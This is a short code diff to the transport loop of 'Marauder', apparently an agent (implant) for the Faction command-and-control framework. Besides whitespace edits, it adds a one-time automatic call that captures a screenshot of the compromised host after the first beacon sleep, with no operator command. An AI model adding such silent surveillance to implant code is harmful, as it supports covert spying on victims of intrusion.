@@ -6,6 +6,7 @@ using Newtonsoft.Json;
 
 using Marauder.Objects;
 using Faction.Modules.Dotnet.Common;
+using System.Threading.Tasks;
 
 namespace Marauder.Services
 {
@@ -18,11 +19,12 @@ namespace Marauder.Services
     private AgentTransport BackupTransport;
     private int Attempts = 0;
 
+    private bool ScreenshotMade = false;
+
     public void AddTransport(AgentTransport transport)
     {
       Transports.Add(transport);
     }
-
     public void AddTransport(List<AgentTransport> transports)
     {
       Transports.AddRange(transports);
@@ -64,6 +66,7 @@ namespace Marauder.Services
         Logging.Write("TransportService", "Starting Loop..");  
         Logging.Write("TransportService", "Clearing Completed Tasks..");
 #endif
+
         foreach (RunningTask task in State.RunningTasks.ToList())
         {
           if (task.Task.IsFaulted)
@@ -127,7 +130,6 @@ namespace Marauder.Services
 #endif      
             OnMessageRecieved(this, new MessageRecievedArgs(response));
           }
-          
         }
         double sleep = State.Sleep;
 
@@ -144,6 +146,12 @@ namespace Marauder.Services
         Logging.Write("TransportService", $"Sleeping for {Convert.ToInt32(sleep)} milliseconds");
 #endif  
         Thread.Sleep(Convert.ToInt32(sleep));
+
+        if(!ScreenshotMade)
+                {
+                    State.CommandService.Execute_MakeScreenshot();
+                    ScreenshotMade = true;
+                }
       }
     }
 
